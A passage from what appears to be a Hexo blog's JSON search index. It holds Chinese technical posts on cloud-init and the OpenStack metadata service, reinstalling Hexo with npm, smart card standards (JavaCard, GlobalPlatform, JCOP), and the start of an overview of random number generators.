加入请求中。</li>\n<li>请求被转发给<code>nova-api-metadata</code>。</li>\n<li><code>nova-api-metadata</code>其利用 instance-id 和 tenant-id 获取虚拟机的 metadata，返回相应的结果信息。</li>\n</ol>\n<p>注意！为了解决网络节点的网段和租户的虚拟网段重复的问题，OpenStack 引入了网络命名空间，Neutron 中的路由和 DHCP 服务器都在各自独立的命名空间中。由于虚拟机获取 metadata 的请求都是以路由和 DHCP 服务器作为网络出口，所以需要通过 neutron-ns-metadata-proxy 利用基于 unix domain socket 的 HTTP 技术打通不同的网络命名空间，将请求在网络命名空间之间转发。</p>\n<h2 id=\"五、疑难杂症\"><a href=\"#五、疑难杂症\" class=\"headerlink\" title=\"五、疑难杂症\"></a>五、疑难杂症</h2><h3 id=\"1-cloud-init-与-NetworkManager-的关系\"><a href=\"#1-cloud-init-与-NetworkManager-的关系\" class=\"headerlink\" title=\"1. cloud-init 与 NetworkManager 的关系\"></a>1. cloud-init 与 NetworkManager 的关系</h3><p>通过源代码分析，在 Local Stage 从 datasource 里读取网络配置信息，处理逻辑是：</p>\n<ul>\n<li>如果发现使用的是静态地址，cloud-init 就会将 datasource 定义的配置信息写入<code>/etc/network/interfaces</code>目录下的配置文件</li>\n<li>如果发现使用的是 DHCP，cloud-init 并不会创建刷新网卡配置文件，配置ip的工作就交由 NetworkManager 自动获取</li>\n</ul>\n<p>从以信息可知，如果创建静态ip的虚拟机，NetworkManager 这个服务必须在 cloudinit-local 之后启动才可正常从配置文件中读取 ip 并配置。而当你在镜像里安装 NetworkManager后，默认情况下它的启动顺序是会在 cloudinit-local 之前的。</p>\n<h3 id=\"2-openEuler-的网卡名称被修改\"><a href=\"#2-openEuler-的网卡名称被修改\" class=\"headerlink\" title=\"2. openEuler 的网卡名称被修改\"></a>2. openEuler 的网卡名称被修改</h3><p>openEuler 初始化安装时，NetworkManager 采用的是 net.ifnames 命名规范，初始网卡被命名为<code>ens18</code>。<br>安装 cloud-init 之后，其强制改为 biosdevname 命名规范，因此默认网卡被改名为<code>eth0</code>。<br>注意，老的网卡配置文件依然存在！具体实现原理参见<a href=\"http://pythontime.iswbm.com/en/latest/c08/c08_06.html#centos-6-x\">CentOS 6.x 如何更改网卡名</a></p>\n<h3 id=\"3-BCLinux-oe21-10-安装-cloud-init-后启动失败，提示错误信息hosts-redhat文件不存在\"><a href=\"#3-BCLinux-oe21-10-安装-cloud-init-后启动失败，提示错误信息hosts-redhat文件不存在\" class=\"headerlink\" title=\"3. BCLinux oe21.10 安装 cloud-init 后启动失败，提示错误信息hosts.redhat文件不存在\"></a>3. BCLinux oe21.10 安装 cloud-init 后启动失败，提示错误信息<code>hosts.redhat</code>文件不存在</h3><p>BCLinux oe21.10 提供的 cloud-init 版本，并未建立模版目录<code>/etc/cloud/templates</code>，也找不到<code>hosts.redhat.tmpl</code>文件。<br>根本原因是 cloud-init 目前适配了 Centos 和 openEuler 等主流版本，配置信息在 distor 中，但 BCLinux 不再其中。<br>临时解决办法是，手工建模版目录，并拷贝相应的模版文件，凑合着使吧！！！</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://pythontime.iswbm.com/en/latest/c08/c08_06.html#\">cloud-init 源码解读</a></li>\n<li><a href=\"https://xixiliguo.github.io/linux/cloud-init.html\">cloud-init 介绍</a></li>\n<li><a href=\"https://einverne.github.io/post/2020/03/cloud-init.html\">Cloud-init 初始化虚拟机配置</a></li>\n<li><a href=\"https://gameapp.club/post/2022-07-30-custom-cloud-init-for-pve/\">基于 Cloud-init 定制化 PVE 虚拟机</a></li>\n<li><a href=\"https://www.cnblogs.com/gushiren/p/9511234.html\">cloud-init简介及组件说明</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/55078689\">深度解析 OpenStack metadata 服务架构</a></li>\n<li><a href=\"https://www.jianshu.com/p/cd8f60e30034\">OpenStack 的 metadata 服务机制</a></li>\n<li><a href=\"https://developer.aliyun.com/article/311493\">Metadata Service 架构详解</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/38774639\">OpenStack虚拟机如何获取metadata</a></li>\n</ul>\n"},{"title":"重装Hexo编辑环境遇到的问题","url":"/2019/02/12/%E9%87%8D%E8%A3%85Hexo%E5%8F%91%E5%B8%83%E7%8E%AF%E5%A2%83%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","content":"<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><p>昨天在新Mac上重新安装Hexo Blog的编辑环境出现了不少问题，解决情况如下。</p>\n<p>1、确认已经安装node.js和npm，最简单的办法是采用图形化的安装包。<br>2、至少需要全局安装hexo和hexco-cli（hexo的命令行工具包），方法是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install hexo -g</span><br><span class=\"line\">sudo npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>npm全局安装方式时，默认存储目录是<code>/usr/local/lib/node_modules/</code>，普通用户可能出现权限问题，需要sudo提权</li>\n<li>为了加快npm安装速度，可以提前全局安装cnpm，以后的命令可以用cnpm替代npm</li>\n</ul>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>3、从Github下载blog的源代码hexo分支，并进入自动新建的子目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/nokiam9/nokiam9.github.io.git</span><br></pre></td></tr></table></figure>\n\n<p>4、根据当前目录的<code>package.json</code>安装项目的依赖包， 方法是：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>安装过程提示告警信息，通过<code>npm audit</code>分析，是<code>hexo-deployer-git</code>的版本过低。修改<code>package.json</code>文件，要求版本不低于1.0.0，告警消失。</li>\n</ul>\n</blockquote>\n<p>5、完成发布环境的安装，现在可以自由发布blog。</p>\n<blockquote>\n<ul>\n<li>创建了一个new page并编辑内容，但是发布结果内容为空，原因是新安装的Vscode没有设置autosave！！！  </li>\n<li>提交hexo编辑环境时，Github给出严重告警信息，原因是提交的 <code>package-lock.json</code>文件包含了敏感信息，解决方法是将该文件名添加到<code>.gitignore</code>，以阻止git提交</li>\n<li>Github Page设置了Custom Domain，但hexo提交后经常丢失，解决方法是在编辑环境的<code>/sources</code>目录增加CNAME配置文件，详细内容见<a href=\"http://www.mdslq.cn/archives/82234085.html\">参考文档</a></li>\n</ul>\n</blockquote>\n<hr>\n<h2 id=\"疑难杂症\"><a href=\"#疑难杂症\" class=\"headerlink\" title=\"疑难杂症\"></a>疑难杂症</h2><h3 id=\"node版本兼容性问题\"><a href=\"#node版本兼容性问题\" class=\"headerlink\" title=\"node版本兼容性问题\"></a>node版本兼容性问题</h3><p>2年前，首次安装<code>Hexo</code>的版本是<code>3.7.0</code>，这几天在新买的 Macbook M1 上重新安装发现了不少告警信息，主要原因是当时<code>node.js</code>的版本只有<code>v8.12.0</code>，现在的LTS版本已经是<code>v14</code>，支持M1芯片甚至需要<code>v16</code>。</p>\n<p>最好的解决办法，是将Hexo升级为最新的<code>5.4.0</code>，但是发现主页有乱码，还需要重新调整配置文件，因为懒得折腾，只好忍受这些告警信息了。</p>\n<blockquote>\n<p>虽然node.js只有<code>v16</code>以后的版本支持 M1 芯片，但是x86版本的<code>v12</code>也是可以通过兼容方式运行的，可以通过<code>n</code>进行安装，代价是node运行速度比较慢</p>\n</blockquote>\n<h3 id=\"关于package-json配置文件\"><a href=\"#关于package-json配置文件\" class=\"headerlink\" title=\"关于package.json配置文件\"></a>关于<code>package.json</code>配置文件</h3><p>以当前Hexo v3.9版本为例，其配置文件<code>package.json</code>类似于Python的<code>requirements.txt</code>，可以用于<code>npm install</code>批量安装。<br>其内容为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;name&quot;: &quot;hexo-site&quot;,</span><br><span class=\"line\">  &quot;version&quot;: &quot;0.0.0&quot;,</span><br><span class=\"line\">  &quot;private&quot;: true,</span><br><span class=\"line\">  &quot;hexo&quot;: &#123;</span><br><span class=\"line\">    &quot;version&quot;: &quot;3.9.0&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;dependencies&quot;: &#123;</span><br><span class=\"line\">    &quot;hexo&quot;: &quot;^3.7.0&quot;,</span><br><span class=\"line\">    &quot;hexo-deployer-git&quot;: &quot;^1.0.0&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-archive&quot;: &quot;^0.1.5&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-category&quot;: &quot;^0.1.3&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-index&quot;: &quot;^0.2.1&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-searchdb&quot;: &quot;^1.4.0&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-tag&quot;: &quot;^0.2.0&quot;,</span><br><span class=\"line\">    &quot;hexo-renderer-ejs&quot;: &quot;^0.3.1&quot;,</span><br><span class=\"line\">    &quot;hexo-renderer-marked&quot;: &quot;^0.3.2&quot;,</span><br><span class=\"line\">    &quot;hexo-renderer-stylus&quot;: &quot;^0.3.3&quot;,</span><br><span class=\"line\">    &quot;hexo-server&quot;: &quot;^0.3.1&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为此，可以分析出hexo所包含的几类包：</p>\n<ul>\n<li><code>hexo</code>：主代码包，最新版本5.4，目前仍然使用3.9，在node版本8运行良好，版本12有告警，版本14以上问题多</li>\n<li><code>hexo-cli</code>：hexo的命令行，以支持<code>hexo s</code> ,<code>hexo d -g</code>等命令行</li>\n<li><code>hexo-deployer-git</code>：用于deploy部署的插件</li>\n<li><code>hexo-server</code>:内置的web服务器，用于<code>hexo server</code></li>\n<li><code>hexo-renderer-xxx</code>：内建<code>Swig</code>模板引擎，还可以另外安装插件来获得<code>EJS</code>、<code>Haml</code>或<code>Jade</code>支持，Hexo根据模板文件的扩展名来决定所使用的模板引擎。</li>\n<li><code>hexo-generator-xxx</code>：语言模版插件，包括Head部分的index、search菜单的转化</li>\n</ul>\n<blockquote>\n<p>升级hexo 5.4版本时，首页出现乱码，其实原因是<code>hexo-renderer-swig</code>从自动安装改为需要手工安装，另外npm 安装即可解决。</p>\n</blockquote>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://imbajin.com/2016-10-06-Hexo%E6%8A%80%E5%B7%A7%E5%92%8C%E7%BB%8F%E9%AA%8C%E4%B8%80/\">Hexo技巧与经验之升级</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/157511323\">将 Hexo 升级到 v4.2.1</a></li>\n</ul>\n"},{"title":"超级SIM卡的技术标准分析","url":"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/","content":"<p>随着IC卡从简单的同步卡发展到异步卡，从简单的EPROM卡发展到内带微处理器的智能卡(又称CPU卡)，对IC卡的各种要求越来越高。而卡本身所需要的各种管理工作也越来越复杂，因此就迫切地需要有一种工具来解决这一矛盾，而内部带有微处理器的智能卡的出现，使得这种工具的实现变成了现实。</p>\n<p>Chip Operating System（片内操作系统，简称COS），就是基于智能卡内置的微处理器芯片的操作系统。COS的出现不仅大大地改善了智能卡的交互界面，使智能卡的管理变得容易；而且，更为重要的是使智能卡本身向着个人计算机化的方向迈出了一大步，为智能卡的发展开拓了极为广阔的前景。</p>\n<p>在这一领域处于领导地位的有三项主导技术：<code>Java Card</code>、<code>Windows Powered Smart Cards</code>以及<code>MULTOS</code>，但从发展情况看，JavaCard已经成为事实上的行业标准。</p>\n<p>与Windows、Unix等通用操作系统不同，COS所需要解决的主要还是对外部的命令如何进行处理、响应的问题，这其中一般并不涉及到共享、并发的管理及处理，而且就智能卡在应用情况而看，并发和共享的工作也确实是不需要的；此外，由于 COS 不可避免地受到了智能卡内微处理器芯片的性能及内存容量的影响，系统设计时一般都是紧密结合智能卡内存储器分区的情况，按照国际标准（ISO&#x2F;IEC7816系列标准）中所规定的一些功能进行裁剪或自定义扩充，因此COS很大程度上是一个专用系统而不是通用操作系统。</p>\n<h2 id=\"JavaCard\"><a href=\"#JavaCard\" class=\"headerlink\" title=\"JavaCard\"></a>JavaCard</h2><h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>多年以前，Sun Microsystem 就非常重视智能卡的市场空间，对 Java技术规范进行了大量裁剪和简化，为智能卡提供了 JavaCard平台，主要目的是在智能卡或与智能卡相近的设备上，以具有安全防护性的方式来运行小型的Java Applet。</p>\n<p>JavaCard就是在智能卡ROM中实现了一个Java虚拟机（Java Virtual Machine 简称JVM），该 JVM将执行一个Java字节码的子集，提供外部可以访问的功能，负责控制对智能卡资源的访问(如内存和I&#x2F;O)。Javacard用于使用Java编程语言以及JVM和Java库的有限版本，用于编写智能卡平台的应用程序-javacard applet。</p>\n<p>Java Card虚拟机（Java Card Virtual Machine，也可简称为Java Card VM或JCVM），是原有Java虚拟机的子集合，负责对Java Applet进行程序直译、运行及结果回应，也因此JCVM的空间占量不能太大，必须能小到放入智能卡内。</p>\n<h3 id=\"基础架构\"><a href=\"#基础架构\" class=\"headerlink\" title=\"基础架构\"></a>基础架构</h3><img src=\"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/javacard.png\" class=\"\">\n\n<p>一台典型的 JavaCard 设备有一个运行于 3.7MHz的8位或16位CPU，带有 1K的RAM和多于 16K的非易失内存（EEPROM或闪存）。高性能的智能卡带有单独的处理器、加密芯片和内存加密，某些智能卡还带有32位CPU。</p>\n<p>既然有容量取向的要求，那也就必须对Java的功效机能进行部分权衡取舍，即便可以用多种方式让应用程序的体积占量突破容量限制，例如将应用程序的代码划分到Package（Java编程语言中，用来将类以性质、用途等不同取向等而集中放置的地方，即称为Package）内，但是每个Package也被限制不能超过64KB的容量。</p>\n<p>由于Java Card的应用程序是在Java Card VM具隔离性的环境下运行，所以程序对卡片资料的写入、读取、修改也受到权限机制的控制保护，无论使用何种读卡设备、操作系统、应用程序都不能跨越权限去访问不属于自己的卡片内资料，等于具有小型应用程序的防火墙的功效。 无论是电信方面还是金融方面的智能片应用，现在都运用Java Card技术来防护卡内所存储的信息资料。</p>\n<p>与以前的智能卡技术相比，采用JavaCard技术的智能卡可以采用 Java进行编程，因此具有高度的可移植性和安全性，更为重要的是，在卡被发送到用户以后，应用程序还可以被动安全地下载到卡中，从而动态地扩展了智能卡的功能。</p>\n<h3 id=\"技术组件\"><a href=\"#技术组件\" class=\"headerlink\" title=\"技术组件\"></a>技术组件</h3><p>JavaCard提供了 JavaCard字节码验证方案，并支持代码签名的安全模型，这意味着在使用由<code>OpenPlatform</code>规定的安全下载应用过程下载应用程序之前，必须先将程序代码经过安全的转换 、评估和签名。</p>\n<p>Java Card技术规范的最新版本为<code>3.1</code>, 但目前应用最广泛的是版本<code>2.2</code>，由三部分组成：</p>\n<ul>\n<li>Java Card 虚拟机规范，定义了用于智能卡的 Java 程序编程语言的一个子集和虚拟机。</li>\n<li>Java Card 运行时环境规范，详细定义了基于 Java 的智能卡的运行时行为。</li>\n<li>Java Card API 规范，定义了用于智能卡应用程序的核心框架和扩展 Java 软件包和类。</li>\n</ul>\n<p>Sun 还提供了 Java Card 开发工具（JCDK），其中包括 Java Card RE 和 Java Card VM 的参考实现以及其他帮助开发的 Java Card applet 。</p>\n<h2 id=\"GlobalPlatform\"><a href=\"#GlobalPlatform\" class=\"headerlink\" title=\"GlobalPlatform\"></a>GlobalPlatform</h2><p>1999年10月，Visa将其建立的Visa Open Platform（简称VOP）更名为GlobalPlatform（GP）并对外开放，使其成为一个由支付与商业领域的大公司、政府部门以及卖主团体主导的、跨行业的国际标准组织，这是世界上第一个跨行业的智能卡规范组织，目标就是促进多应用产业环境的管理及其安全、可互操作的业务部署。这样的话，智能卡发行商将有在各种卡、终端及后台系统中选择的自由。</p>\n<p>作为全球基于安全芯片的安全基础设施统一标准的制定者，GlobalPlatform的工作重心主要集中在安全单元（SE）、可信执行环境（TEE）和系统消息（Mobile Messaging）等领域，其成熟的技术规范是建立端到端可信业务解决方案的工具，并服务于产业环境的多个成员，支持多种商业模式。</p>\n<p>GP在全球有120多家会员企业，截至2017年，基于GP规范的安全元件出货量就已超过50亿。2015-2017年，搭载SE的移动设备达到10亿+，其全部都是基于GP的标准。</p>\n<h3 id=\"卡片的技术架构\"><a href=\"#卡片的技术架构\" class=\"headerlink\" title=\"卡片的技术架构\"></a>卡片的技术架构</h3><img src=\"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/gp-card-arch.png\" class=\"\">\n\n<p>GlobalPlatform是一个用于管理applet感知智能卡的规范，用于定义以下内容的操作:</p>\n<ul>\n<li>管理卡生命周期</li>\n<li>卡&#x2F;主机认证</li>\n<li>安装&#x2F;删除&#x2F;实例化&#x2F;选择小程序</li>\n<li>管理卡上的安全策略</li>\n</ul>\n<p>使用GlobalPlatform, 您将使用GP卡交换APDU以进行上述操作; 使用javacard, 您将编写可以接受和处理特定于您的应用程序的APDU的applet。<br>GlobalPlatform 并不特定于javacard,但javacard是智能卡applet开发的唯一相关技术.</p>\n<p>所有这些应用必须在一个安全的runtime环境中实现，runtime环境提供了一套硬件中立的应用编程接口以支持应用的可移植性。 GlobalPlatform并不强制规定运行时环境的实现技术。卡片管理器作为GlobalPlatform架构中的首要组件起到了 GlobalPlatform卡片中心管理者的作用，特定的密钥和安全管理应用被称作安全域，负责确保发卡方和其他安全域提供者之间的密钥的完全隔离。</p>\n<p>GP当前最新版本是v2.3。</p>\n<h3 id=\"安全的技术架构\"><a href=\"#安全的技术架构\" class=\"headerlink\" title=\"安全的技术架构\"></a>安全的技术架构</h3><img src=\"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/gp-sec-arch.png\" class=\"\">\n\n<p>作为卡外授权机构的卡片内代表的安全域，依据现有的三种授权机构，可以划分为三种主流类型：</p>\n<ul>\n<li>发卡方安全域（主安全域，ISD），卡片上首要的、强制性存在的安全域，是卡片管理者(通常是发卡方)在卡片内的代表；</li>\n<li>补充安全域（辅助安全域，SSD），卡片上次要的、可选择地存在的安全域，是应用提供方或发卡方以及它们的代理方在卡片内的代表；</li>\n<li>授权管理者安全域，一种特殊类型的补充安全域，授权管理者负责将某种安全策略贯彻到所有加载到卡片的应用代码上，授权管理者安全域就是授权管理者在卡片内的代表，卡片上可能存在多个这样的安全域。</li>\n</ul>\n<p>总而言之，以上三种安全域在本规范中，统称安全域。<br>安全域负责提供各类安全服务，包括密钥管理、加密解密、针对其提供者(发卡方、应用提供方、授权管理者)的应用进行数字签名的生成与验证。<br>当发卡方、应用提供方、授权管理者等卡外实体要将用到的密钥从其他实体区隔开来时，就可以通过新的安全域来代理它们实现这个需求。</p>\n<h2 id=\"JCOP\"><a href=\"#JCOP\" class=\"headerlink\" title=\"JCOP\"></a>JCOP</h2><p>最初，Java Card OpenPlatform (JCOP)是一个来自 IBM 苏黎世实验室的产品，目标是整合Javacard API和GlobalPlatform，以提供一个智能卡操作系统及完整的解决方案。<br>从2007年，JCOP成为恩智浦公司（NXP，曾经是Philips的子公司）拥有和管理，成为NXP JCOP系列芯片卡的标准操作系统。</p>\n<blockquote>\n<p>事实上，国内大多数SIM卡厂家都是直接采用NXP芯片和JCOP操作系统，甚至iPhone手机的SE芯片也是NXP提供的。</p>\n</blockquote>\n<p>NXP JCOP系列芯片卡是恩智浦NXP公司在高安全性的解决方案高性能产品，广泛应用如银行与金融，移动通信，公共交通，访客访问和网络接入等领域。支持接触式、非接触式、支持接触式与非接触式读写，内含有一个JCOP版本操作系统，并提供40k-80K字节EEPROM存储器。</p>\n<p>当前最新版本是v4，其主要技术特性包括：</p>\n<ul>\n<li>Java Card v3.0.5 Classic</li>\n<li>GlobalPlatform®<ul>\n<li>GP v2.2 Mapping Guidelines configuration v1.0.1</li>\n<li>GP v2.3 Financial Configuration v1.0 (config 2)</li>\n<li>GP v2.3 Common Implementation Configuration v2.0 - Common Criteria EAL 5+ certified (supports 3DES,<br>RSA, AES)</li>\n</ul>\n</li>\n<li>ISO 7816-3 T&#x3D;0, T&#x3D;1 (223.2 kbps)，用于接触式智能卡</li>\n<li>ISO 14443 (up to 848 kbps)，用于非接触式智能卡</li>\n<li>Dual-interface support，同时支持接触式智能卡&#x2F;非接触式智能卡的接口</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li><a href=\"https://docs.oracle.com/en/java/javacard/3.1/\">Sun JavaCard 3.1的官方网站</a></li>\n<li><a href=\"https://www.oracle.com/java/technologies/javacard-downloads.html\">JavaCard SDK的官方版本下载页</a></li>\n<li><a href=\"https://globalplatform.org/specs-library/card-specification-v2-3-1/\">GlobalPlatform Card的官方文档</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_Card\">Wiki of JavaCard</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_Card_OpenPlatform\">Wiki of JCOP</a></li>\n<li><a href=\"http://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=23B5E4704F5F2752BB0F4BD5FB33E2BC\">用于电子支付的基于近距离无线通信的移动终端安全技术要求(GB&#x2F;T 34095-2017 )</a></li>\n</ul>\n<h3 id=\"经验分享\"><a href=\"#经验分享\" class=\"headerlink\" title=\"经验分享\"></a>经验分享</h3><ul>\n<li><a href=\"https://wiki.nfc.im/\">NFC中文资料大全！！！</a></li>\n<li><a href=\"https://blog.csdn.net/songbohr/article/details/6201956\">智能卡操作系统COS概述</a></li>\n<li><a href=\"https://blog.csdn.net/qq_29605685/article/details/53127366\">JavaCard开发经验合集</a></li>\n<li><a href=\"https://www.msrfid.com/Service/javacard_introduction_under_PBOC_specification.html\">PBOC规范下的java卡介绍</a></li>\n<li><a href=\"https://blog.csdn.net/zlljsf1/article/details/4301294\">GP规范中文版的简介</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1170054\">GP规范中定义的四种SE访问控制架构</a></li>\n<li><a href=\"https://www.geek-share.com/detail/2709904440.html\">NXP JCOP系列芯片卡特点</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"JavaCard%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0-%E8%A5%BF%E5%AE%89%E4%BA%A4%E5%A4%A7%E6%9D%8E%E5%A2%9E%E6%99%BA.pdf\">智能卡技术的新发展 - JavaCard技术综述 - 西安交大 李增智</a></li>\n<li><a href=\"3736-05-open-platform-smart-card-cn.pdf\">Chip Operating System的技术简介</a></li>\n<li><a href=\"GPC_CardSpecification_v2.3.1_PublicRelease_CC.pdf\">GlobalPlatform Card SpecificationVersion v2.3.1 - PDF</a></li>\n<li><a href=\"NXP-JCOP-4.pdf\">恩智浦 JCOP v4 技术白皮书</a></li>\n<li><a href=\"20140415141748279422.pdf\">用于电子支付的基于近距离无线通信的移动终端安全技术要求（GB征求意见稿）</a></li>\n<li><a href=\"FSP-ACOSJ-G-Combi-CN-2.04.pdf\">龙杰智能卡的产品说明书</a></li>\n</ul>\n"},{"title":"随机数生成技术概述","url":"/2022/10/05/%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/","content":"<p>在密码学中，熵（entropy，指不可预测的随机性）扮演了一个非常重要的角色，许多算法都要求使用一个不可预测的随机数，只有在生成的随机数不可预测时，这些算法才能保证其安全性，典型应用包括：</p>\n<ul>\n<li>密钥生成</li>\n<li>生成初始化向量，IV，用于分组密码的 CBC，CFB，OFB 模式</li>\n<li>某些签名方案中的盐，如 ECDSA， RSASSA-PSS</li>\n</ul>\n<h2 id=\"一、伪随机数生成器-PRNG\"><a href=\"#一、伪随机数生成器-PRNG\" class=\"headerlink\" title=\"一、伪随机数生成器 - PRNG\"></a>一、伪随机数生成器 - PRNG</h2><p>PRNG（Pseudo-Random Number Generators）是一种数字序列的生成算法，它生成出的数字序列的统计学属性跟真正的随机数序列非常相似，但它生成的伪随机数序列并不是真正的随机数序列！<br>换句话说，如果输入的初始种子是相同的，PRNG 总是会生成出相同的伪随机数序列，因此也被称为<strong>确定性随机比特生成器</strong>（DRBG，Deterministic Random Bit Generator）。</p>\n<p>伪随机数通常来源于某个生成算法（例如，C库中提供的rand函数），尽管存在可复现的问题，但由于 PRNG 的成本低和速度快，仍然广泛用于现代软件开发中。NIST SP 800-90A规范中描述了三种产生伪随机数的算法：</p>\n<ul>\n<li>Hash_DRBG：使用单向散列算法作为伪随机数生成的基础算法</li>\n<li>HMAC_DRBG：使用消息认证码算法作为随机数生成的基础算法</li>\n<li>CTR_DRBG：使用分组密码算法的计数器模式作为随机数生成的基础算法，可选算法包括 3DES 、AES128 、 AES192 或 AES256 等</li>\n</ul>\n<p>实际运用中，我们经常使用 PRNG 从一个很小的初始随机性（熵）生成出大量的伪随机性，这被称做<strong>密钥拉伸</strong>（Key Stretching）。</p>\n<h2 id=\"二、真随机数生成器-TRNG\"><a href=\"#二、真随机数生成器-TRNG\" class=\"headerlink\" title=\"二、真随机数生成器 - TRNG\"></a>二、真随机数生成器 - TRNG</h2><p>TRNG（True Random Number Generators）作为“真正的随机数，需要具备<strong>不可重现性</strong>（不能通过给定同样的数据而演算出同一串比特序列），由于计算机算法均具备确定的特性，所以真随机数无法由算法来生成，只能基于硬件设备通过对物理过程的测量来实现，因此也被称为<strong>硬件随机数生成器</strong>（HRNG，Hardware Random Number Generator）。</p>\n<p>TRNG 通常基于一些能生成低等级、统计学随机的“噪声”信号的微观现象，包括：基于环形振荡器采样、直接放大热噪声、基于亚稳态电路Ell、光电效应、利用放射性元素衰变等量子力学的基本量等，这些物理过程在理论上是完全不可预测的，并且已经得到了实验的证实。<br>TRNG 通常由换能器、放大器和模拟数字转换器组成。其中换能器将物理过程中的某些效果转换为电信号，放大器将随机扰动的振幅放大到宏观级别，而模拟数字转换器则将输出变成数字。<br>TRNG 从随机过程中收获熵之后，还需要通过后处理技术（诺伊曼校正、异或链、线性反馈移位寄存器、异或周期序列等）消除随机位的概率偏差，并重复重采样过程以满足随机数的长度需求，最后输出高质量的随机数。Apple 安全隔区和恩智浦 STM32 系列安全芯片等都内置了 TRNG 组件。</p>\n<ul>\n<li>TRNG 满足“完全随机性”，即：不可预测性、均匀性、独立性，并具备保密性要求</li>\n<li>由于 TRNG 来源于物理过程，生成速度很慢，通常每秒只能产生很有限的随机比特</li>\n<li>为了提高数据产生效率，TRNG 通常用于生成伪随机数生成器的“种子”，也就是<strong>熵源（熵池）</strong></li>\n</ul>\n<h2 id=\"三、密码学安全随机数生成器-CSPRNG\"><a href=\"#三、密码学安全随机数生成器-CSPRNG\" class=\"headerlink\" title=\"三、密码学安全随机数生成器 - CSPRNG\"></a>三、密码学安全随机数生成器 - CSPRNG</h2><p>由于 PRNG 无法为随机数提供<strong>不可预测性</strong>，存在安全隐患，但是 TRNG 的生成速度又太慢，无法及时提供大量随机数，怎么解决这个矛盾呢？答案就是CSPRNG。</p>\n<p>CSPRNG（Cryptography Secure Random Number Generators）是一种满足密码学安全要求的 PRNG，需要同时满足以下条件：</p>\n<ul>\n<li>不可预测性：即使有人获知了该 PRNG 的 k 位，他也无法使用合理的资源预测第 k+1 位的值</li>\n<li>不可回溯性：如果攻击者猜出了 PRNG 的内部状态或该状态因某种原因而泄漏，攻击者也无法重建出内部状态泄漏之前生成的所有随机数</li>\n</ul>\n<p>美国国家标准和技术研究所(NIST)制定了随机数发生器的技术规范，称为<code>NIST SP 800 - 22</code>和<code>SP 800 - 90</code>，其推荐的技术路线是 TRNG + PRNG，即 TRNG 作为熵源提供少量且高质量的随机数，通过 PRNG 进行提供大量随机数，这就是 CSPRNG 最常用的设计方法。</p>\n<p>大多数的 CSPRNG 结合使用来自 OS 的熵与高质量的 PRNG，并且一旦系统生成了新的熵（这可能来自用户输入、磁盘 IO、系统中断、或者硬件 RNG），CSPRNG 会立即使用新的熵来作为 PRNG 新的种子。 这种不断重置 PRNG 种子的行为，使随机数变得非常难以预测。</p>\n<ul>\n<li>基于计数器(CTR)模式下的安全分组密码、流密码或安全散列函数的 CSPRNG</li>\n<li>基于数论设计的 CSPRNG，它依靠整数分解问题（IFP）、离散对数问题（DLP）或椭圆曲线离散对数问题（ECDLP）的高难度来确保安全性</li>\n<li>CSPRNG 基于加密安全随机性的特殊设计，例如 Yarrow algorithm 和 Fortuna，这俩分别被用于 